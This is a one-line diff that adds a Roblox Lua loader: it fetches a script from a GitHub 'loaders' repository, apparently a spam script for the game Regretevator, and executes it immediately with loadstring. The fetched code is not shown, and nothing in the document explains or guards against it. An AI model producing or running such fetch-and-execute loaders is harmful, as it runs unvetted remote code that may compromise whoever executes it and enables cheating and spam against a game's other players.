@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/regretevator-elevator-simulator-spam1-be4w90opgy5hxg.lua"))()
